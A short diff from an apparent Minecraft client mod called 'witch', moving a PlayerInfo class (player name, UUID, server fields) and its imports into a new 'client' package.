@@ -1,9 +1,9 @@
-package me.soda.witch.features;
+package me.soda.witch.client.features;
 
-import me.soda.witch.utils.ShellUtil;
+import me.soda.witch.client.utils.ShellUtil;
 import net.minecraft.client.network.ClientPlayerEntity;
 
-import static me.soda.witch.Witch.mc;
+import static me.soda.witch.client.Witch.mc;
 
 public class PlayerInfo {
     public String playerName, uuid, server;
